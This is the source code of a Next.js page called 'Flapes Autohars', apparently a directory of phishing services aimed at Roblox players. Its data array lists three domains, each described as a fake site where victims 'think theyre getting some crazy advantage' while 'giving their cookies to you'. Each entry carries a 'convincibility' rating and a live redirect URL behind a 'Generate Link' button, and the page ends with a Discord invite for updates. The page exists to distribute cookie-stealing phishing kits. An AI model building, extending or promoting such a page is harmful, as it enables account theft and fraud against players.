"use client"

import Link from "next/link"
import { ArrowLeft, Shield, Search, Filter, Star, X, LinkIcon } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { ParticleBackground } from "@/components/particle-background"
import { useState, useMemo } from "react"

const autohars = [
  {
    id: 1,
    title: "bloxtools.st",
    description:
      "Create a fake Site where people think theyre getting some crazy advantage, but in reality theyre just giving their cookies to you",
    speed: 5.0,
    convincibility: "90-95%",
    features: [],
    category: "phishing",
    author: "SecurityMaster",
    rating: 4.9,
    detailCategory: "Phishing",
    status: "active",
    badge: "OP AND TRENDY",
    badgeColor: "bg-blue-600/30",
    redirectUrl: "https://bloxtools.st/generator/controllerrPage/",
  },
  {
    id: 2,
    title: "bloxlab.st",
    description:
      "Create a fake Site where people think theyre getting some crazy advantage, but in reality theyre just giving their cookies to you (The video might not be very accurate but it depends on how you do it)",
    speed: 4.5,
    convincibility: "80-95%",
    features: [],
    category: "phishing",
    author: "SocialMediaPro",
    rating: 4.6,
    detailCategory: "Phishing",
    status: "active",
    badge: "TONS OF FEAUTRES",
    badgeColor: "bg-red-600/30",
    redirectUrl: "https://bloxlab.st/dashboard/?code=NjQwMTg3ODExNzc4ODYwODcyNF8wMTYyNTgyMTg1NDA0NjA4ODM3",
  },
  {
    id: 3,
    title: "bloxtools.sbs",
    description:
      "Create a fake Site where people think theyre getting some crazy advantage, but in reality theyre just giving their cookies to you (basically same as bloxlab.st)",
    speed: 4.0,
    convincibility: "70-85%",
    features: [],
    category: "phishing",
    author: "TechExpert",
    rating: 4.8,
    detailCategory: "Phishing",
    status: "active",
    badge: "VERY SIMILAR TO bloxlab.st",
    badgeColor: "bg-green-600/30",
    redirectUrl: "https://app.beaming.pro/u/FlapesAutohar",
    altBadge: "ALTERNATIVE AUTOHAR, USE ONLY AT NEED",
  },
]

export default function AutoharsPage() {
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedCategory, setSelectedCategory] = useState("all")
  const [showFilters, setShowFilters] = useState(false)
  const [selectedAutohar, setSelectedAutohar] = useState<(typeof autohars)[0] | null>(null)

  const filteredAutohars = useMemo(() => {
    return autohars.filter((autohar) => {
      const matchesSearch =
        autohar.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
        autohar.description.toLowerCase().includes(searchTerm.toLowerCase())

      const matchesCategory = selectedCategory === "all" || autohar.category === selectedCategory

      return matchesSearch && matchesCategory
    })
  }, [searchTerm, selectedCategory])

  const openAutoharModal = (autohar: (typeof autohars)[0]) => {
    setSelectedAutohar(autohar)
  }

  const closeAutoharModal = () => {
    setSelectedAutohar(null)
  }

  return (
    <div className="min-h-screen bg-black text-white relative overflow-hidden">
      <ParticleBackground />

      <div className="relative z-10 p-8">
        {/* Back Button with enhanced hover */}
        <Link href="/">
          <Button className="mb-8 bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg font-medium transition-all duration-300 hover:scale-105 hover:shadow-lg hover:shadow-red-500/25 group">
            <ArrowLeft className="w-4 h-4 mr-2 group-hover:-translate-x-1 transition-transform duration-300" />
            Back to Home
          </Button>
        </Link>

        {/* Header with enhanced styling */}
        <div className="flex items-center justify-center gap-3 mb-4">
          <Shield className="w-8 h-8 text-red-400 animate-pulse" />
          <h1 className="text-4xl font-bold text-red-400 drop-shadow-2xl tracking-wide">Flapes Autohars</h1>
          <Shield className="w-8 h-8 text-red-400 animate-pulse" />
        </div>

        {/* No Key Features Notice */}
        <div className="text-center mb-6">
          <p className="text-yellow-400 text-lg font-medium">
            No key features for any Autohar because autohars are basically all the same, just difference in the website
            design
          </p>
        </div>

        {/* Status Legend */}
        <div className="text-center mb-8">
          <p className="text-white text-lg font-semibold">
            🟢 = ACTIVE
            <span className="mx-4">🔴 = INACTIVE</span>
          </p>
        </div>

        {/* Search and Filter with enhanced functionality */}
        <div className="flex gap-4 mb-6 max-w-6xl mx-auto">
          <div className="relative flex-1">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-gray-400" />
            <Input
              placeholder="Search autohars..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="pl-10 bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-400 hover:bg-gray-900/70 focus:border-red-400 transition-all duration-300"
            />
          </div>
          <Button
            onClick={() => setShowFilters(!showFilters)}
            className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg transition-all duration-300 hover:scale-105 hover:shadow-lg hover:shadow-red-500/25 group"
          >
            <Filter
              className={`w-4 h-4 mr-2 transition-transform duration-300 ${showFilters ? "rotate-180" : ""} group-hover:scale-110`}
            />
            Filters
          </Button>
        </div>

        {/* Filter Panel */}
        {showFilters && (
          <div className="max-w-6xl mx-auto mb-6 p-4 bg-red-900/20 border border-red-600/30 rounded-lg backdrop-blur-sm animate-in slide-in-from-top-2 duration-300">
            <div className="grid grid-cols-1 md:grid-cols-1 gap-4">
              <div>
                <label className="block text-sm font-medium text-white mb-2">Category</label>
                <select
                  value={selectedCategory}
                  onChange={(e) => setSelectedCategory(e.target.value)}
                  className="w-full bg-red-800/30 border border-red-600/50 text-white rounded-lg px-3 py-2 hover:bg-red-800/40 transition-colors"
                >
                  <option value="all">All Categories</option>
                  <option value="phishing">Phishing</option>
                  <option value="social">Social</option>
                  <option value="gaming">Gaming</option>
                </select>
              </div>
            </div>
          </div>
        )}

        <p className="text-gray-400 text-sm mb-8 max-w-6xl mx-auto">
          Showing {filteredAutohars.length} autohar{filteredAutohars.length !== 1 ? "s" : ""}
          {searchTerm && ` matching "${searchTerm}"`}
        </p>

        {/* Autohars Grid with enhanced cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-6xl mx-auto">
          {filteredAutohars.map((autohar, index) => (
            <div
              key={autohar.id}
              onClick={() => window.open(autohar.redirectUrl, "_blank", "noopener,noreferrer")}
              className="border border-red-400/30 rounded-lg p-6 bg-black/40 backdrop-blur-sm hover:border-red-400/50 transition-all duration-300 hover:scale-[1.02] hover:shadow-lg hover:shadow-red-500/20 group cursor-pointer relative"
              style={{ animationDelay: `${index * 100}ms` }}
            >
              {/* Hover overlay with "Generate Link" */}
              <div className="absolute inset-0 bg-black/70 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity duration-300 rounded-lg">
                <div className="flex items-center gap-2 text-white font-medium bg-red-600 px-4 py-2 rounded-lg">
                  <LinkIcon className="w-5 h-5 text-white" />
                  <span>Generate Link</span>
                </div>
              </div>

              {/* Header */}
              <div className="flex items-start justify-between mb-4">
                <div className="flex items-center gap-3">
                  <div className="p-2 rounded-lg bg-gray-800/50 text-green-400 group-hover:scale-110 transition-transform duration-300">
                    <span className="text-xl">🟢</span>
                  </div>
                  <div className="flex-1">
                    <h3 className="font-bold text-white text-lg group-hover:text-red-300 transition-colors">
                      {autohar.title}
                    </h3>
                    {autohar.altBadge && (
                      <div className="text-xs text-orange-400 font-medium mt-1">{autohar.altBadge}</div>
                    )}
                  </div>
                </div>
                <div className={`px-2 py-1 rounded text-xs text-white font-medium ${autohar.badgeColor}`}>
                  {autohar.badge}
                </div>
              </div>

              {/* Description */}
              <p className="text-gray-300 text-sm mb-4 line-clamp-3 group-hover:text-gray-200 transition-colors">
                {autohar.description}
              </p>

              {/* Stats */}
              <div className="space-y-3 mb-4">
                <div className="flex items-center gap-2">
                  <span className="text-orange-400 text-sm">⚡ Speed:</span>
                  <div className="flex items-center gap-1">
                    {[...Array(5)].map((_, i) => (
                      <Star
                        key={i}
                        className={`w-4 h-4 ${i < autohar.speed ? "text-yellow-400 fill-current" : "text-gray-600"}`}
                      />
                    ))}
                    <span className="text-gray-400 text-sm ml-1">({autohar.speed.toFixed(1)})</span>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-red-400 text-sm">💀 Convincibility:</span>
                  <span className="text-white text-sm font-semibold">
                    {typeof autohar.convincibility === "string"
                      ? autohar.convincibility
                      : `${autohar.convincibility}/5`}
                  </span>
                </div>
              </div>
            </div>
          ))}
        </div>

        {filteredAutohars.length === 0 && (
          <div className="text-center py-12">
            <div className="text-gray-400 text-lg mb-2">No autohars found</div>
            <div className="text-gray-500 text-sm">Try adjusting your search or filter criteria</div>
          </div>
        )}

        {/* Adding More Domains Notice */}
        <div className="text-center py-12 border-t border-red-400/30 mt-12">
          <p className="text-white text-lg font-semibold">
            ADDING MORE DOMAINS SOON! STAY TUNED, JOIN{" "}
            <a
              href="https://discord.gg/qnDrD3rU2M"
              target="_blank"
              rel="noopener noreferrer"
              className="text-red-400 hover:text-red-300 underline transition-colors duration-300"
            >
              https://discord.gg/qnDrD3rU2M
            </a>{" "}
            TO STAY UP TO DATE!!
          </p>
        </div>
      </div>

      {/* Autohar Detail Modal */}
      {selectedAutohar && (
        <div
          className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4"
          onClick={closeAutoharModal}
        >
          <div
            className="bg-gray-900 border border-red-400/30 rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Header */}
            <div className="flex items-center justify-between p-6 border-b border-red-400/30">
              <div className="flex items-center gap-3">
                <span className="text-2xl">🟢</span>
                <h2 className="text-xl font-bold text-white">{selectedAutohar.title}</h2>
                <span className="text-2xl">🟢</span>
              </div>
              <Button
                onClick={closeAutoharModal}
                className="bg-transparent hover:bg-red-600/20 text-white p-2 rounded-lg"
              >
                <X className="w-5 h-5" />
              </Button>
            </div>

            {/* Modal Content */}
            <div className="p-6">
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* Left Column */}
                <div className="space-y-6">
                  {/* Status */}
                  <div>
                    <h3 className="text-red-400 font-semibold mb-2">Status:</h3>
                    <div className="flex items-center gap-2">
                      <span className="text-2xl">🟢</span>
                      <span className="font-semibold text-green-400">ACTIVE</span>
                    </div>
                  </div>

                  {/* Speed Rating */}
                  <div>
                    <h3 className="text-red-400 font-semibold mb-2">⚡ Speed Rating</h3>
                    <div className="flex items-center gap-2">
                      {[...Array(5)].map((_, i) => (
                        <Star
                          key={i}
                          className={`w-5 h-5 ${i < selectedAutohar.speed ? "text-yellow-400 fill-current" : "text-gray-600"}`}
                        />
                      ))}
                      <span className="text-white font-semibold">{selectedAutohar.speed}/5</span>
                    </div>
                  </div>

                  {/* Convincibility */}
                  <div>
                    <h3 className="text-red-400 font-semibold mb-2">💀 Convincibility:</h3>
                    <p className="text-white font-semibold text-lg">
                      {typeof selectedAutohar.convincibility === "string"
                        ? selectedAutohar.convincibility
                        : `${selectedAutohar.convincibility}/5`}
                    </p>
                  </div>

                  {/* Action Buttons */}
                  <div className="grid grid-cols-1 gap-3">
                    <Button
                      onClick={() => window.open(selectedAutohar.redirectUrl, "_blank", "noopener,noreferrer")}
                      className="bg-red-600 hover:bg-red-700 text-white py-3 rounded-lg font-medium"
                    >
                      <LinkIcon className="w-4 h-4 mr-2" />
                      Generate Link
                    </Button>
                  </div>
                </div>

                {/* Right Column */}
                <div className="space-y-6">
                  {/* Information */}
                  <div>
                    <h3 className="text-red-400 font-semibold mb-4">Information</h3>
                    <div className="space-y-2 text-sm">
                      <div className="flex justify-between">
                        <span className="text-gray-400">Author:</span>
                        <span className="text-white">{selectedAutohar.author}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Rating:</span>
                        <span className="text-white">{selectedAutohar.rating} ⭐</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Category:</span>
                        <span className="text-green-400">{selectedAutohar.detailCategory}</span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Description - Full Width */}
                <div className="lg:col-span-2">
                  <h3 className="text-red-400 font-semibold mb-4">📝 Description</h3>
                  <p className="text-gray-300">{selectedAutohar.description}</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
